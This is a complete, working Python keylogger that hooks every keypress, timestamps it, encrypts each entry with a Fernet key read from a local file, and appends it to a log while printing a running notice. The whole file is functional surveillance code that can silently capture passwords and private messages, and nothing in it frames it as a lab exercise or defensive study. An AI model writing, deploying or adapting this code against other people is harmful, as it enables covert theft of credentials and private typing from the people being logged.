import keyboard
from cryptography.fernet import Fernet
import time

# Load the encryption key from the file
with open("key.key", "rb") as key_file:
    key = key_file.read()

# Initialize the Fernet cipher with the key
cipher = Fernet(key)

# Function to handle key presses and log them securely
def on_key_press(event):
    log_entry = f"{time.ctime()} - {event.name}\n"  # Log key with timestamp
    encrypted_entry = cipher.encrypt(log_entry.encode())  # Encrypt the log entry
    
    # Append encrypted entry to the log file
    with open("keystrokes.log", "ab") as log_file:
        log_file.write(encrypted_entry + b"\n")

# Start capturing keystrokes
keyboard.on_press(on_key_press)

print("Keylogger running... Press Ctrl+C to stop.")

# Keep the script running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nKeylogger stopped.")
